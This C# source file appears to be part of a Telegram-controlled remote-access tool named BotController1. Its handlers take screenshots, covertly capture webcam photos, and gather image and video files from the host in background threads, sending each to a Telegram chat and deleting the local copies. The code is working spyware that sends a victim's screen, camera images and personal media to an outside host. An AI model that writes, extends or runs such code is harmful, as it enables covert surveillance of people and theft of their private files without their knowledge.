using BotController1.Core;
using BotController1.Telegram;

namespace BotController1.Handlers;

public class MediaHandlers : HandlerBase
{
    private readonly TelegramClient _tg;

    public MediaHandlers(TelegramClient tg) : base(tg) => _tg = tg;

    public void Screenshot(TgMessage message)
    {
        if (!Authorize(message))
            return;
        Tg.SendMessage(message.ChatId, "📸 Taking screenshot...");
        var path = Capture.Screenshot();
        if (path != null)
        {
            Tg.SendPhoto(message.ChatId, path, "💻 Current screen");
            try { File.Delete(path); } catch { }
        }
        else
        {
            Tg.SendMessage(message.ChatId, "❌ Failed to capture screenshot");
        }
    }

    public void Screen(TgMessage message)
    {
        if (!Authorize(message))
            return;
        var path = Capture.Screenshot();
        if (path != null)
        {
            Tg.SendPhoto(message.ChatId, path, "💻 Screenshot");
            try { File.Delete(path); } catch { }
        }
        else
        {
            Tg.SendMessage(message.ChatId, "❌ Failed to capture screenshot.");
        }
    }

    public void Webcam(TgMessage message)
    {
        if (!Authorize(message))
            return;
        Tg.SendMessage(message.ChatId, "📸 Accessing webcam...");
        var path = Capture.Webcam();
        if (path != null)
        {
            Tg.SendPhoto(message.ChatId, path, "👁️ Webcam capture");
            try { File.Delete(path); } catch { }
        }
        else
        {
            Tg.SendMessage(message.ChatId, "❌ Failed to capture webcam image");
        }
    }

    public void Webcam3(TgMessage message)
    {
        if (!Authorize(message))
            return;
        Tg.SendMessage(message.ChatId, "📸 Capturing multiple webcam images...");
        var files = Capture.WebcamMulti(3);
        if (files.Count > 0)
        {
            for (var i = 0; i < files.Count; i++)
            {
                Tg.SendPhoto(message.ChatId, files[i], $"👁️ Webcam capture {i + 1}/3");
                try { File.Delete(files[i]); } catch { }
            }
        }
        else
        {
            Tg.SendMessage(message.ChatId, "❌ Failed to capture webcam images");
        }
    }

    public void GrabPic(TgMessage message)
    {
        if (!Authorize(message))
            return;
        if (BotState.IsRunning)
        {
            Tg.ReplyTo(message, $"⚠️ Another task is already running: {BotState.CurrentTask}");
            return;
        }
        var chatId = message.ChatId;
        var types = new[] { ".jpg", ".jpeg", ".png", ".gif", ".bmp" };
        var thread = new Thread(() =>
            MediaCollector.UploadTask(_tg, chatId, types, Program.MaxImages,
                Program.MaxImageSizeMb, true)) { IsBackground = true };
        thread.Start();
        Tg.ReplyTo(message, "🔎 Starting image collection...");
    }

    public void GrabVideos(TgMessage message)
    {
        if (!Authorize(message))
            return;
        if (BotState.IsRunning)
        {
            Tg.ReplyTo(message, $"⚠️ Another task is already running: {BotState.CurrentTask}");
            return;
        }
        var chatId = message.ChatId;
        var types = new[] { ".mp4", ".avi", ".mov", ".wmv", ".mkv", ".flv" };
        var thread = new Thread(() =>
            MediaCollector.UploadTask(_tg, chatId, types, Program.MaxVideos,
                Program.MaxVideoSizeMb, false)) { IsBackground = true };
        thread.Start();
        Tg.ReplyTo(message, "🔎 Starting video collection...");
    }

    public void Stop(TgMessage message)
    {
        if (!Authorize(message))
            return;
        if (BotState.IsRunning)
        {
            var taskType = BotState.CurrentTask;
            BotState.IsRunning = false;
            BotState.CurrentTask = null;
            Tg.ReplyTo(message, $"🛑 Stopping {taskType} task.");
        }
        else
        {
            Tg.ReplyTo(message, "ℹ️ No tasks currently running.");
        }
    }
}
